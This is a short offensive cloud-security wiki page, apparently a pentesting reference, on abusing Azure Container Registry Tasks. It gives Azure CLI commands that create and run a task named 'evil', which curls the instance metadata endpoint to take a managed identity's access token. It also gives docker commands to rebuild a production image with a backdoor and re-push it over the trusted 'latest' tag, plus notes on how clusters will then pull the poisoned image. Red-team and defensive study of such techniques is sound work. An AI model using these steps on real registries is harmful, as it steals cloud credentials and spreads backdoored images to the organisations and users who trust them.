---
title: "Tasks: ACR Tasks as a managed identity and image poisoning"
description: "Running an ACR Task that executes in-registry as a managed identity, and pushing poisoned images to a trusted repository."
keywords:
  - ACR Tasks
  - managed identity
  - image push
  - trusted repository
  - build
---

# Tasks

**ACR Tasks** run container build and command steps on Azure-managed compute inside the registry, and a task can be assigned a **managed identity**. Creating or running a task becomes code execution as that identity, and the registry is a trusted source that downstream AKS and App Service pull from, so a poisoned image spreads.

## Run a task as the registry identity

```bash
# a quick task runs an arbitrary build step; with an assigned identity it holds that identity's token
az acr task create -r <registry> -n evil --context /dev/null \
  --cmd 'curl -s -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?...' --assign-identity [system]
az acr task run -r <registry> -n evil
```

## Poison a trusted image

```bash
docker pull <registry>.azurecr.io/app:latest
# rebuild with a backdoor, keep the tag
docker build -t <registry>.azurecr.io/app:latest .
docker push <registry>.azurecr.io/app:latest
```

## Exploitation notes

- The task's managed identity is the prize: it runs on Azure compute you do not have to own, and its token acts across whatever scope the identity holds.
- Re-pushing the `latest` tag over a production image is a durable, quiet supply-chain backdoor until the digest is pinned.
- Pair with [AKS node identity](../aks/node-identity.md): the kubelet's `AcrPull` means the cluster will pull your poisoned image.

## Tools

- **Azure CLI** (`az acr task create/run`).
- **docker** / **crane**: rebuild and push images.

## References

- [Microsoft: ACR Tasks](https://learn.microsoft.com/azure/container-registry/container-registry-tasks-overview)
- [HackTricks Cloud: ACR](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
